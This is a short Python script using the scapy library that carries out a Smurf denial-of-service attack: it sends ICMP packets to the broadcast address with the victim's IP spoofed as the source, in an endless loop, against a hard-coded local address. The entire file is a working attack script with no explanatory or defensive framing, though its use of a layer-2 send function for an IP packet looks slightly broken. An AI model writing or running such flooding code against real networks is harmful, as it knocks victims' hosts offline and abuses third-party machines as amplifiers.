from scapy.all import *
import ipaddress
def Smurf_Attack(victim_ip):#smurfing the vitctim ip
	print victim_ip
	smurf_packet =  IP(src=victim_ip,dst="255.255.255.255")/ICMP()
	sendp(smurf_packet,loop=1)


Smurf_Attack('192.168.0.102')

